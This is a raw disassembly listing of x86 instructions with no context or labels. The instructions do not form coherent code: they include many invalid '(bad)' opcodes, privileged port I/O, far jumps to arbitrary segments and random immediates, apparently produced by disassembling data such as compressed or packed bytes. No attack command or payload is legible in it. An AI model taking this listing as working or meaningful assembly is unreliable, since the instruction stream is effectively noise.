  416dc4:	mov    edx,0x651bbd59
  416dc9:	pop    ds
  416dca:	imul   ecx,DWORD PTR [edx-0x1cad1997],0x4a
  416dd1:	add    al,BYTE PTR [edx]
  416dd3:	jl     0x416dcb
  416dd5:	sub    DWORD PTR [ebx],esi
  416dd7:	imul   DWORD PTR [edi-0x69e7c9e6]
  416ddd:	pop    ds
  416dde:	dec    esi
  416ddf:	out    dx,eax
  416de0:	pusha  
  416de1:	and    ch,dl
  416de3:	(bad)  
  416de5:	inc    esp
  416de6:	in     al,0xdc
  416de8:	mov    ds:0x20fc62ad,eax
  416ded:	loopne 0x416d84
  416def:	shl    ebp,0x55
  416df2:	jl     0x416e65
  416df4:	push   0x7e2327f1
  416df9:	pop    ecx
  416dfa:	mov    ds:0x3046b8bf,eax
  416dff:	adc    ecx,ecx
  416e01:	daa    
  416e02:	inc    eax
  416e03:	push   ebp
  416e04:	dec    esi
  416e05:	add    DWORD PTR ds:0x697bf543,0xffffff84
  416e0c:	in     eax,dx
  416e0d:	cli    
  416e0e:	jmp    0x282e:0xc9781a23
  416e15:	test   al,0x60
  416e17:	xchg   ah,al
  416e19:	enter  0xd34f,0xe1
  416e1d:	fld    TBYTE PTR [esi]
  416e1f:	mov    edx,0xcddfc644
  416e24:	inc    edx
  416e25:	mov    dl,0x97
  416e27:	dec    edi
  416e28:	lods   al,BYTE PTR ds:[esi]
  416e29:	mov    bl,0x87
  416e2b:	sbb    edx,0xffffffe0
  416e2e:	sbb    al,dh
  416e30:	and    al,dl
  416e32:	(bad)
  416e36:	fbstp  TBYTE PTR [ebx]
  416e38:	jp     0x416e5d
  416e3a:	xchg   ebx,eax
  416e3b:	xor    DWORD PTR [edi+0x6a4b6118],ecx
  416e41:	retf   
  416e42:	pop    esi
  416e43:	or     al,0x4b
  416e45:	gs push 0xffffffab
  416e48:	clc    
  416e49:	aam    0x53
  416e4b:	push   edx
  416e4c:	inc    ebp
  416e4d:	cmc    
  416e4e:	xor    dl,BYTE PTR [ecx+0x41]
  416e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e52:	xor    ecx,DWORD PTR [ecx+0x60b8a953]
  416e58:	xchg   esi,eax
  416e59:	pop    esi
  416e5a:	enter  0xfd59,0xa
  416e5e:	mov    edi,0xb84c0c95
  416e63:	push   ecx
  416e64:	sti    
  416e65:	out    dx,eax
  416e66:	add    BYTE PTR [ebx+0x4],0xec
  416e6a:	gs mov edi,0x5db7548
  416e70:	cwde   
  416e71:	cli    
  416e72:	push   ds
  416e73:	outs   dx,BYTE PTR ds:[esi]
  416e74:	xchg   esi,eax
  416e75:	inc    bx
  416e77:	jo     0x416e8e
  416e79:	and    BYTE PTR [edx+0x7f],dl
  416e7c:	xchg   ecx,eax
  416e7d:	ror    BYTE PTR [esi],0x4c
  416e80:	push   ss
  416e81:	fs retf 
  416e83:	fcmovnb st,st(7)
  416e85:	push   ecx
  416e86:	retf   
  416e87:	ins    DWORD PTR es:[edi],dx
  416e88:	or     BYTE PTR [ecx],0xc1
  416e8b:	addr16 out 0x25,al
  416e8e:	lahf   
  416e8f:	mov    ch,0x53
  416e91:	mov    bh,BYTE PTR [edi]
  416e93:	xchg   ecx,eax
  416e94:	xchg   ebx,eax
  416e95:	in     al,dx
  416e96:	inc    ecx
  416e97:	ins    BYTE PTR es:[edi],dx
  416e98:	test   BYTE PTR [esi+0x4e87e80e],0xdf
  416e9f:	mov    eax,ds:0x6b1667f5
  416ea4:	les    eax,FWORD PTR [ebx]
  416ea6:	dec    ecx
  416ea7:	scas   eax,DWORD PTR es:[edi]
  416ea8:	xchg   esi,eax
  416ea9:	call   0xbe1d5722
  416eae:	dec    ebp
  416eaf:	push   es
  416eb0:	xor    DWORD PTR [esi-0x27569843],edx
  416eb6:	outs   dx,DWORD PTR ds:[esi]
  416eb7:	in     al,dx
  416eb8:	out    dx,al
  416eb9:	inc    ebx
  416eba:	sub    BYTE PTR [ebp+0x1a3a1ac6],dh
  416ec0:	in     eax,0x7a
  416ec2:	out    dx,al
  416ec3:	mov    eax,eax
  416ec5:	adc    esp,edi
  416ec7:	dec    edx
  416ec8:	adc    al,0x4
  416eca:	inc    esi
  416ecb:	pop    ecx
  416ecc:	imul   ebx,edx,0x1
  416ecf:	je     0x416f27
  416ed1:	jo     0x416eee
  416ed3:	pop    ss
  416ed4:	jae    0x416e59
  416ed6:	xchg   edi,eax
  416ed7:	adc    DWORD PTR [ebx-0x4c93068b],esp
  416edd:	push   ebp
  416ede:	inc    ebx
  416edf:	iret   
  416ee0:	sbb    ebx,DWORD PTR [eax+edi*8+0x26]
  416ee4:	stos   BYTE PTR es:[edi],al
  416ee5:	in     al,0x80
  416ee7:	dec    DWORD PTR [ecx+0x229e47b]
  416eed:	sub    BYTE PTR [edi],bl
  416eef:	es sbb al,0x5c
  416ef2:	pop    esp
  416ef3:	cmp    BYTE PTR [edx],ch
  416ef5:	mov    DWORD PTR [ebx],ecx
  416ef7:	out    dx,al
  416ef8:	aam    0x40
  416efa:	test   DWORD PTR [esi-0x55],0x43695f26
  416f01:	mov    edx,0x21b70424
  416f06:	and    al,ch
  416f08:	mov    cl,BYTE PTR [ebp+0x467b245f]
  416f0e:	sbb    BYTE PTR [ecx+ebp*8],ch
  416f11:	ja     0x416f5e
  416f13:	mov    edx,0x6f8cf528
  416f18:	cmp    dl,BYTE PTR [edi]
  416f1a:	jl     0x416ee2
  416f1c:	stos   DWORD PTR es:[edi],eax
  416f1d:	out    dx,eax
  416f1e:	test   BYTE PTR [ebx+0x25ec2135],bh
  416f24:	jmp    0x9fc6:0xfd5e2da0
  416f2b:	mov    bh,0x44
  416f2d:	and    cl,BYTE PTR [ecx+0x39d369d5]
  416f33:	mov    ch,0xea
  416f35:	sbb    BYTE PTR [esi+edx*1+0x55],cl
  416f39:	cdq    
  416f3a:	mov    dh,0xfb
  416f3c:	(bad)  
  416f3d:	fisubr DWORD PTR [ecx+0x67]
  416f40:	mov    al,0xd2
  416f42:	adc    bl,ch
  416f44:	sub    al,0xdd
  416f46:	push   ss
  416f47:	xchg   DWORD PTR [ebp+0x1522622c],edi
  416f4d:	out    0xe9,al
  416f4f:	inc    edi
  416f50:	sbb    eax,0xe75b1bb
  416f55:	ret    
  416f56:	retf   0xe725
  416f59:	sub    BYTE PTR [edi],0x48
  416f5c:	or     eax,0xd
  416f5f:	cmp    al,0x9e
  416f61:	and    al,0x34
  416f63:	das    
  416f64:	add    DWORD PTR [esi-0x284865f5],eax
  416f6a:	jno    0x416fab
  416f6c:	xchg   ebp,eax
  416f6d:	mov    WORD PTR [edx+0x26],ds
  416f70:	mov    dl,0x21
  416f72:	lea    esp,[edi-0x302bfa67]
  416f78:	mov    dh,0x10
  416f7a:	jb     0x416ff0
  416f7c:	fstp   st(3)
  416f7e:	sub    DWORD PTR [ecx-0x47],0x6e0b36c5
  416f85:	sub    eax,0xee3f07da
  416f8a:	js     0x416f71
  416f8c:	in     al,dx
  416f8d:	dec    edx
  416f8e:	ja     0x416fc8
  416f90:	jge    0x416fa3
  416f92:	jl     0x416ff1
  416f94:	adc    BYTE PTR [eax+0x1856403f],0x48
  416f9b:	call   0xf1e1:0xf817a50f
  416fa2:	mov    ds:0x93761749,al
  416fa7:	add    dl,bl
  416fa9:	add    dl,BYTE PTR [eax-0xaa5f4cb]
  416faf:	cs or  al,0x8f
  416fb2:	mov    DWORD PTR [ecx],edi
  416fb4:	xchg   ebp,eax
  416fb5:	enter  0x5a66,0x91
  416fb9:	test   eax,0x3951944d
  416fbe:	sub    BYTE PTR [eax+0x159246c2],bh
  416fc4:	sub    al,ch
  416fc6:	xor    BYTE PTR [ecx-0x2],0xde
  416fca:	xor    al,0x31
  416fcc:	ins    BYTE PTR es:[edi],dx
  416fcd:	xor    BYTE PTR [edi-0x7f],bh
  416fd0:	int3   
  416fd1:	xchg   edi,eax
  416fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fd3:	xchg   DWORD PTR [eax+edi*2-0x42b2013b],edx
  416fda:	cmp    al,0xfb
  416fdc:	xor    ebx,DWORD PTR [edi+0x49]
  416fdf:	mov    ecx,0xcc98164
  416fe4:	xor    dl,BYTE PTR [eax+0x2c3dae60]
  416fea:	cmc    
  416feb:	in     eax,dx
  416fec:	sub    ecx,DWORD PTR [eax]
  416fee:	jmp    DWORD PTR [eax+0x762f02e7]
  416ff4:	and    al,0x8e
  416ff6:	mov    edi,0x17250051
  416ffb:	loope  0x417014
  416ffd:	or     DWORD PTR [ecx+0x4c59a738],ebp
  417003:	mov    eax,ds:0x7df707dd
  417008:	sbb    bh,BYTE PTR [esi+0x55]
  41700b:	les    esi,FWORD PTR [edi]
  41700d:	out    dx,eax
  41700e:	xlat   BYTE PTR ds:[ebx]
  41700f:	loope  0x416fd0
  417011:	jnp    0x41702d
  417013:	setg   BYTE PTR [eax+ebx*2]
  417017:	xchg   ebp,eax
  417018:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41701a:	outs   dx,BYTE PTR ds:[esi]
  41701b:	shl    DWORD PTR [ebx],1
  41701d:	xchg   edx,ebp
  41701f:	xor    BYTE PTR [ecx],0x55
  417022:	int3   
  417023:	dec    edx
  417024:	mov    bl,bh
  417026:	(bad)  
  417027:	jns    0x417047
  417029:	aam    0x38
  41702b:	nop
  41702c:	std    
  41702d:	ds clc 
  41702f:	and    DWORD PTR [edx-0x42],edx
  417032:	test   eax,0x8254a435
  417037:	aad    0x9f
  417039:	xor    eax,0x176d6c2
  41703e:	sahf   
  41703f:	out    0x3f,eax
  417041:	mov    eax,ds:0xdb7f997f
  417046:	mov    edi,DWORD PTR [ebp-0x1741cf07]
  41704c:	and    BYTE PTR [edi-0x2c],0x1e
  417050:	xchg   DWORD PTR [edi-0x4e],ebx
  417053:	xor    ch,BYTE PTR [esi]
  417055:	pop    esi
  417056:	push   ss
  417057:	xchg   DWORD PTR [edi],ebx
  417059:	inc    esp
  41705a:	sbb    ecx,DWORD PTR [ebx-0x1a]
  41705d:	sti    
  41705e:	sub    DWORD PTR [ecx-0x64],ecx
  417061:	xchg   ebx,eax
  417062:	scas   eax,DWORD PTR es:[edi]
  417063:	xchg   edi,eax
  417064:	cwde   
  417065:	pop    eax
  417066:	add    eax,0x691c3282
  41706b:	(bad)  
  41706c:	mov    esp,0x235faece
  417071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417072:	mov    esi,0xf4c29afd
  417077:	push   esp
  417078:	xchg   ebp,eax
  417079:	popf   
  41707a:	bound  ebx,QWORD PTR [edx]
  41707c:	cmp    esp,DWORD PTR [edx-0x7e55d167]
  417082:	shr    DWORD PTR [eax],1
  417084:	xor    BYTE PTR [ebp-0x28],dh
  417087:	mov    bh,BYTE PTR [edi]
  417089:	sub    eax,0x9294392b
  41708e:	lea    esi,[ebx]
  417090:	sub    eax,0x7d8f6542
  417095:	lds    eax,FWORD PTR [ecx]
  417097:	add    eax,0xbc5eb79d
  41709c:	les    ebx,FWORD PTR [edi-0x20]
  41709f:	inc    esp
  4170a0:	ror    dl,cl
  4170a2:	cli    
  4170a3:	mov    al,ds:0xaeb269b
  4170a8:	and    ebx,DWORD PTR [eax-0x15d14270]
  4170ae:	cld    
  4170af:	xchg   BYTE PTR ds:[esi],al
  4170b2:	inc    ebx
  4170b3:	jp     0x417131
  4170b5:	scas   al,BYTE PTR es:[edi]
  4170b6:	or     al,0xda
  4170b8:	ins    BYTE PTR es:[edi],dx
  4170b9:	sti    
  4170ba:	push   esp
  4170bb:	cmp    eax,0xae66f5f5
  4170c0:	icebp  
  4170c1:	sbb    al,0x6a
  4170c3:	push   ds
  4170c4:	add    bl,cl
  4170c6:	mov    ss,WORD PTR [edx+0x52]
  4170c9:	pop    edi
  4170ca:	pop    ds
  4170cb:	pop    ds
  4170cc:	ficom  WORD PTR [eax+0xc60c0e9]
  4170d2:	and    esi,edx
  4170d4:	pop    esi
  4170d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170d6:	xchg   edi,eax
  4170d7:	jne    0x417087
  4170d9:	mov    edi,0x3863e14d
  4170de:	jmp    0x417111
  4170e0:	dec    ebx
  4170e1:	sti    
  4170e2:	popf   
  4170e3:	jne    0x41713a
  4170e5:	mov    bl,0x3f
  4170e7:	xlat   BYTE PTR ds:[ebx]
  4170e8:	sti    
  4170e9:	inc    edi
  4170ea:	aas    
  4170eb:	add    DWORD PTR [edi-0x1],eax
  4170ee:	cli    
  4170ef:	in     eax,0x2e
  4170f1:	cmp    BYTE PTR [ecx-0x6bf10390],dh
  4170f7:	daa    
  4170f8:	aam    0x90
  4170fa:	jmp    0xe5c5:0x582aa94d
  417101:	loopne 0x41708b
  417103:	cld    
  417104:	push   0xb3f20fbd
  417109:	cwde   
  41710a:	outs   dx,DWORD PTR ds:[esi]
  41710b:	inc    esi
  41710c:	mov    edx,0x40dc5f73
  417111:	popa   
  417112:	es jecxz 0x4170e7
  417115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417116:	dec    edx
  417117:	cmp    BYTE PTR ds:0x48e482cb,0xc6
  41711e:	inc    ebx
  41711f:	stos   BYTE PTR es:[edi],al
  417120:	pushf  
  417121:	dec    ebp
  417122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417123:	or     ecx,0x1b6505ce
  417129:	sar    DWORD PTR [ecx+0x69d35b66],0xb4
  417130:	std    
  417131:	xor    eax,0x175bc7e8
  417136:	imul   eax,DWORD PTR [edx-0x11],0x6263d886
  41713d:	ins    DWORD PTR es:[edi],dx
  41713e:	xor    al,0xfd
  417140:	dec    ebp
  417141:	mov    ebx,0x4be5975d
  417146:	in     eax,dx
  417147:	sbb    DWORD PTR [edi+0x3923b910],0x702ec367
  417151:	push   ss
  417152:	pop    edx
  417153:	mov    al,ds:0x8f3f3823
  417158:	mov    eax,ds:0x3e6e5bcd
  41715d:	add    bh,BYTE PTR [esi+0x4d986e70]
  417163:	aam    0x1c
  417165:	xor    eax,0xfd0fe245
  41716a:	bound  eax,QWORD PTR [ecx+0x60]
  41716d:	cmp    bl,dl
  41716f:	shl    BYTE PTR [ebx],1
  417171:	loope  0x4171c0
  417173:	dec    edi
  417174:	lock cmp dl,BYTE PTR [edx-0x39]
  417178:	(bad)  
  417179:	loop   0x417167
  41717b:	sub    cl,dl
  41717d:	popf   
  41717e:	sbb    BYTE PTR [eax-0x6e76c0b],bh
  417184:	nop
  417185:	mov    eax,DWORD PTR [eax-0x41]
  417188:	pop    ds
  417189:	out    dx,al
  41718a:	mov    bh,0x5a
  41718c:	sub    DWORD PTR [eax-0x54],ebp
  41718f:	lds    edi,FWORD PTR [edi]
  417191:	jb     0x417192
  417193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417194:	dec    edx
  417195:	jae    0x4171be
  417197:	mov    ebp,0xe3329cea
  41719c:	cmovo  eax,DWORD PTR [edx]
  41719f:	jb     0x41713d
  4171a1:	xchg   esp,eax
  4171a2:	nop
  4171a3:	shl    BYTE PTR [esi-0x6b],cl
  4171a6:	retf   0xe30a
  4171a9:	ror    al,1
  4171ab:	bound  edx,QWORD PTR [edx+0xa832762]
  4171b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171b2:	dec    ebx
  4171b3:	mov    ah,0x91
  4171b5:	adc    eax,0xc2950ec
  4171ba:	or     eax,0x8b929fc2
  4171bf:	inc    edi
  4171c0:	ror    BYTE PTR [edi-0x47],1
  4171c3:	cwde   
  4171c4:	in     eax,dx
  4171c5:	pop    ecx
  4171c6:	jmp    0x41cb6880
  4171cb:	inc    ebx
  4171cc:	jmp    0x7d4d:0xbc52f191
  4171d3:	mov    ch,ah
  4171d5:	and    al,0xd6
  4171d7:	ja     0x4171b4
  4171d9:	cmp    BYTE PTR [eax+0x4698bf5c],dl
  4171df:	jb     0x41718b
  4171e1:	shl    BYTE PTR [esp+eax*8-0x46d30a9],1
  4171e8:	xor    DWORD PTR [ebx-0x72],0x5b
  4171ec:	sti    
  4171ed:	sbb    eax,DWORD PTR [esi+edi*2-0x527e5af5]
  4171f4:	mov    ds:0x5a81ae9f,eax
  4171f9:	mov    eax,ds:0xc700afff
  4171fe:	(bad)  
  417200:	xchg   esp,eax
  417201:	pushf  
  417202:	cwde   
  417203:	in     al,dx
  417204:	sbb    al,0xbe
  417206:	lods   eax,DWORD PTR ds:[esi]
  417207:	in     eax,dx
  417208:	int    0x8b
  41720a:	shl    ebx,cl
  41720c:	(bad)  
  41720e:	pop    ecx
  41720f:	push   ebx
  417210:	pop    ebx
  417211:	sub    eax,0xc6d4e1d9
  417216:	mov    ebp,0xd992c4cf
  41721b:	mov    dh,0x41
  41721d:	pop    ds
  41721e:	fucomi st,st(5)
  417220:	cwde   
  417221:	xor    al,0x8f
  417223:	cmp    ch,BYTE PTR [eax+esi*1-0x59be0c4c]
  41722a:	xor    al,al
  41722c:	mov    ecx,0x31ad6df3
  417231:	pop    ds
  417232:	pop    esi
  417233:	cwde   
  417234:	sub    eax,0x4e43931f
  417239:	or     DWORD PTR [ecx+0x35],ebx
  41723c:	les    eax,FWORD PTR [edi-0x21548f2e]
  417242:	add    eax,DWORD PTR [ebp*1-0x7dc52113]
  417249:	mov    bh,0xba
  41724b:	neg    DWORD PTR [ebx]
  41724d:	pusha  
  41724e:	add    DWORD PTR [eax+0x39],0xd059b452
  417255:	rcl    ebp,cl
  417257:	push   ss
  417258:	ins    DWORD PTR es:[edi],dx
  417259:	nop
  41725a:	dec    ecx
  41725b:	mov    eax,esp
  41725d:	mov    al,ds:0x61fd01dc
  417262:	adc    eax,DWORD PTR [ecx-0x230fadb3]
  417268:	gs push ebp
  41726a:	jge    0x4172e5
  41726c:	enter  0x5900,0x39
  417270:	mov    ds:0x6939bf84,eax
  417275:	inc    eax
  417276:	mov    esi,0xe65f204e
  41727b:	xchg   DWORD PTR [ecx+0x52a3e5da],esi
  417281:	outs   dx,BYTE PTR ds:[esi]
  417282:	rcr    BYTE PTR [ecx-0x69],0x17
  417286:	mov    eax,0x15e86d92
  41728b:	mov    ch,0x22
  41728d:	pop    ss
  41728e:	xchg   edi,eax
  41728f:	outs   dx,BYTE PTR ds:[esi]
  417290:	jb     0x4172a6
  417292:	addr16 pop esi
  417294:	sub    dl,BYTE PTR [esi+0x719ca2c3]
  41729a:	and    bl,0xd4
  41729d:	mov    WORD PTR [eax],?
  41729f:	mov    bl,0x8
  4172a1:	mov    es,WORD PTR [eax]
  4172a3:	(bad)  
  4172a4:	fs add al,cl
  4172a7:	dec    edx
  4172a8:	mov    ecx,0x75a26929
  4172ae:	arpl   di,cx
  4172b0:	aad    0xe6
  4172b2:	repnz ficom DWORD PTR [edx+0x76]
  4172b6:	jmp    0x41725d
  4172b8:	pop    es
  4172b9:	sbb    al,0x5b
  4172bb:	lds    edi,FWORD PTR [ebx-0x32]
  4172be:	mov    al,ds:0x751ddfd
  4172c3:	ss jne 0x41733b
  4172c6:	cmp    eax,0xd87f5b9d
  4172cb:	ss jns 0x4172d7
  4172ce:	push   edx
  4172cf:	push   DWORD PTR ds:0x8b0e326d
  4172d5:	test   DWORD PTR [eax],0xb771fc7
  4172db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172dc:	dec    esp
  4172dd:	inc    eax
  4172de:	xor    DWORD PTR [esi+0x72],0x71e25e98
  4172e5:	push   ds
  4172e6:	mov    dh,0xcf
  4172e8:	rcr    BYTE PTR [edi+0x2054b6db],1
  4172ee:	(bad)  
  4172ef:	out    dx,eax
  4172f0:	mov    eax,0x32d86eed
  4172f5:	xor    eax,edi
  4172f7:	in     eax,dx
  4172f8:	jle    0x4172a3
  4172fa:	(bad)  
  4172fb:	and    eax,edx
  4172fd:	rcr    BYTE PTR [esi+0x61e2bffe],1
  417303:	push   edx
  417304:	iret   
  417305:	mov    al,0x2c
  417307:	add    al,0xf6
  417309:	ins    DWORD PTR es:[edi],dx
  41730a:	mov    bh,0x3f
  41730c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41730d:	cmp    BYTE PTR [eax],cl
  41730f:	sahf   
  417310:	shr    BYTE PTR [esi-0x353b853f],1
  417316:	fst    DWORD PTR [ecx]
  417318:	stos   DWORD PTR es:[edi],eax
  417319:	cmp    al,0x6e
  41731b:	mov    ch,0xe7
  41731d:	sub    BYTE PTR [edi-0x11],cl
  417320:	xor    al,0xc8
  417322:	xlat   BYTE PTR ds:[ebx]
  417323:	loope  0x41738d
  417325:	ss lock imul esp,ecx,0xf38cd56c
  41732d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41732e:	jo     0x4172fd
  417330:	leave  
  417331:	xor    dl,BYTE PTR [ebp-0x4607a517]
  417337:	fld    TBYTE PTR [esi-0x5fd2bc8a]
  41733d:	fcom   st(6)
  41733f:	pusha  
  417340:	xchg   edi,eax
  417341:	xlat   BYTE PTR ds:[ebx]
  417342:	repz shl BYTE PTR ds:0xd22af96d,0x79
  41734a:	dec    ecx
  41734b:	cmp    dl,BYTE PTR [esi-0x74b843e2]
  417351:	dec    DWORD PTR [edi-0x74]
  417354:	and    BYTE PTR [ebp-0x73],bh
  417357:	stos   BYTE PTR es:[edi],al
  417358:	arpl   WORD PTR ds:0x54db21c0,bp
  41735e:	cdq    
  41735f:	loope  0x417356
  417361:	cli    
  417362:	into   
  417363:	not    DWORD PTR [ebx+ecx*8-0x4c]
  417367:	lods   al,BYTE PTR ds:[esi]
  417368:	inc    ebp
  417369:	ss mov ebx,?
  41736c:	pop    edx
  41736d:	ins    DWORD PTR es:[edi],dx
  41736e:	push   esi
  41736f:	loop   0x417351
  417371:	sbb    ch,0x27
  417374:	(bad)  
  417375:	and    al,0x3d
  417377:	scas   al,BYTE PTR es:[edi]
  417378:	pop    es
  417379:	xor    cl,BYTE PTR [edi-0x3f]
  41737c:	lods   eax,DWORD PTR ds:[esi]
  41737d:	lds    esi,FWORD PTR [ecx+ecx*8-0x52]
  417381:	in     eax,0x94
  417383:	stc    
  417384:	add    BYTE PTR [edx+0x21],al
  417387:	push   ebp
  417388:	mov    ecx,0x6e8c0a65
  41738d:	cmp    BYTE PTR [esi+0x8],al
  417390:	outs   dx,DWORD PTR ds:[esi]
  417391:	lahf   
  417392:	push   esi
  417393:	cmp    ecx,esi
  417395:	mov    ecx,0xecc74077
  41739a:	aad    0xab
  41739c:	jmp    0x9b0c5482
  4173a1:	sbb    edi,DWORD PTR ds:[esi+0x6e71fe89]
  4173a8:	xchg   ebp,eax
  4173a9:	in     eax,dx
  4173aa:	es leave 
  4173ac:	dec    eax
  4173ad:	inc    ecx
  4173ae:	aad    0x11
  4173b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173b1:	pop    ebp
  4173b2:	in     al,0x69
  4173b4:	icebp  
  4173b5:	sahf   
  4173b6:	or     al,0xd2
  4173b8:	jl     0x4173c3
  4173ba:	xor    ebx,DWORD PTR [eax+eax*4+0x10285a2e]
  4173c1:	xchg   esi,eax
  4173c2:	fsub   QWORD PTR [edi+ecx*4-0x5880e731]
  4173c9:	jp     0x4173f4
  4173cb:	clc    
  4173cc:	xchg   ebx,eax
  4173cd:	dec    edx
  4173ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173cf:	or     ebp,edi
  4173d1:	popa   
  4173d2:	in     eax,0x5c
  4173d4:	and    edx,DWORD PTR [edx+0x606aa8fd]
  4173da:	(bad)  
  4173db:	shl    BYTE PTR [ebp+0xabeae47],1
  4173e1:	cdq    
  4173e2:	out    dx,al
  4173e3:	xchg   esp,eax
  4173e4:	lea    esp,[eax+0x4dde258b]
  4173ea:	xor    al,0x9f
  4173ec:	sub    eax,0xfd63ad98
  4173f1:	aam    0xcc
  4173f3:	or     edi,ebp
  4173f5:	mov    ebx,0x18f2d3fc
  4173fa:	or     bh,BYTE PTR [edx+0x61]
  4173fd:	inc    ebx
  4173fe:	and    dl,BYTE PTR [ecx-0x1e9afa12]
  417404:	popa   
  417405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417406:	adc    BYTE PTR [ebp+0x76e3cca1],ch
  41740c:	inc    esp
  41740d:	in     eax,dx
  41740e:	sbb    esp,edx
  417410:	or     ah,dh
  417412:	xchg   edi,eax
  417413:	int    0xf7
  417415:	mov    dh,0x92
  417417:	inc    ebx
  417418:	es sbb al,0x13
  41741b:	mov    ds:0xd3d04035,eax
  417420:	fcom   st(5)
  417422:	push   edi
  417423:	pop    edi
  417424:	or     bl,BYTE PTR [edx-0x71]
  417427:	ins    BYTE PTR es:[edi],dx
  417428:	outs   dx,DWORD PTR ds:[esi]
  417429:	test   eax,0xfc1fe03f
  41742e:	adc    al,0xe7
  417430:	test   dl,al
  417432:	aad    0x99
  417434:	popf   
  417435:	inc    esi
  417436:	scas   eax,DWORD PTR es:[edi]
  417437:	loope  0x4173cf
  417439:	jb     0x417475
  41743b:	call   0xa801:0x92d2b20b
  417442:	xchg   esp,eax
  417443:	jne    0x4174b9
  417445:	add    al,0x47
  417447:	std    
  417448:	dec    ecx
  417449:	or     ch,ah
  41744b:	in     al,0xca
  41744d:	stos   BYTE PTR es:[edi],al
  41744e:	shr    BYTE PTR [edi+0x78],cl
  417451:	fs jg  0x4173f6
  417454:	icebp  
  417455:	test   esi,esi
  417457:	ds (bad) 
  417459:	retf   
  41745a:	and    ecx,DWORD PTR [edx-0x1dbfb1b5]
  417460:	fist   WORD PTR [edi+0x18148f3b]
  417467:	dec    eax
  417468:	mov    BYTE PTR [ebx+edi*2-0x1f],dh
  41746c:	loop   0x4174be
  41746e:	in     eax,0x2b
  417470:	push   ecx
  417471:	jb     0x417462
  417473:	addr16 jmp 0x417486
  417476:	(bad)
  41747a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41747b:	repnz sub BYTE PTR [ecx-0x18],0xfd
  417480:	fnstsw WORD PTR [ebx-0x74c2ca59]
  417486:	idiv   BYTE PTR [ecx]
  417488:	and    BYTE PTR [esi],0x61
  41748b:	dec    edi
  41748c:	adc    al,0x91
  41748e:	pop    ecx
  41748f:	mov    ecx,DWORD PTR [ebp-0x7072d1ee]
  417495:	jl     0x41747a
  417497:	push   esp
  417498:	loope  0x4174b0
  41749a:	dec    ecx
  41749b:	mov    ds:0xe5d9b297,al
  4174a0:	std    
  4174a1:	cs das 
  4174a3:	mov    ebp,0x692f2d1
  4174a8:	out    0x42,al
  4174aa:	sbb    DWORD PTR [esi+0x602ecef4],esi
  4174b0:	stc    
  4174b1:	push   edx
  4174b2:	nop
  4174b3:	or     ebx,esp
  4174b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174b6:	sbb    DWORD PTR [ebp+ecx*4+0x19afa737],0xa06eff02
  4174c1:	lods   al,BYTE PTR ds:[esi]
  4174c2:	jae    0x4174c2
  4174c4:	pushf  
  4174c5:	mov    ds:0x8376d95f,eax
  4174ca:	cli    
  4174cb:	jp     0x41747b
  4174cd:	and    eax,0x3418a134
  4174d2:	cdq    
  4174d3:	pop    ecx
  4174d4:	dec    esi
  4174d5:	cdq    
  4174d6:	repz mov eax,0x2d99f0
  4174dc:	std    
  4174dd:	mov    edi,?
  4174df:	add    BYTE PTR [edx+0x7f],bl
  4174e2:	pop    esp
  4174e3:	retf   0x8b1f
  4174e6:	and    al,0x36
  4174e8:	pop    ebp
  4174e9:	les    edx,FWORD PTR [edi+0x1673331e]
  4174ef:	pop    es
  4174f0:	not    DWORD PTR [edi]
  4174f2:	neg    BYTE PTR [eax+0x321619b5]
  4174f8:	clc    
  4174f9:	fdiv   DWORD PTR [eax+0x7f684140]
  4174ff:	nop
  417500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417501:	js     0x417526
  417503:	cmp    DWORD PTR [edi-0x2977d47b],ebx
  417509:	mov    ch,0x1f
  41750b:	icebp  
  41750c:	inc    edi
  41750d:	xor    ecx,edx
  41750f:	and    al,BYTE PTR [eax+0x26d7b2e4]
  417515:	adc    eax,0x6fc12466
  41751a:	xchg   edx,eax
  41751b:	arpl   WORD PTR [ebx+0x1d],si
  41751e:	push   ecx
  41751f:	push   edx
  417520:	out    0x1a,eax
  417522:	repnz fnstenv [ecx]
  417525:	ucomiss xmm0,DWORD PTR [ecx+0x11]
  417529:	lds    ecx,FWORD PTR [esi-0x7c]
  41752c:	stos   BYTE PTR es:[edi],al
  41752d:	int    0x1f
  41752f:	mov    edi,0xa6c16bb2
  417534:	cmp    eax,0x1dbb94ad
  417539:	mov    ebx,0xe40da8e7
  41753e:	dec    edx
  41753f:	xchg   esp,eax
  417540:	in     al,dx
  417541:	push   ecx
  417542:	aaa    
  417543:	and    DWORD PTR [esi+ebx*2+0x6a],ebx
  417547:	cmp    eax,0x510bc480
  41754c:	jg     0x4174cf
  41754e:	cli    
  41754f:	dec    esp
  417550:	sub    BYTE PTR [bp+si+0x2347],0xb6
  417556:	mov    esi,0x4e9f06d9
  41755b:	cmp    DWORD PTR [ebx+ecx*2-0x7f23b1ff],ebx
  417562:	mov    ds:0x9d25c7fa,eax
  417567:	lods   al,BYTE PTR ds:[esi]
  417568:	repnz add esi,eax
  41756b:	rol    DWORD PTR [edx-0x2a89e20f],1
  417571:	loopne 0x4175a5
  417573:	jl     0x417558
  417575:	shr    BYTE PTR [ebx-0x4d7adb0e],cl
  41757b:	into   
  41757c:	mov    bl,BYTE PTR [ebp-0x5a352d00]
  417582:	out    dx,al
  417583:	add    DWORD PTR [ecx+0x7f],ebx
  417586:	inc    esp
  417587:	repnz (bad) 
  417589:	(bad)
  41758d:	dec    esi
  41758e:	scas   al,BYTE PTR es:[edi]
  41758f:	inc    ebp
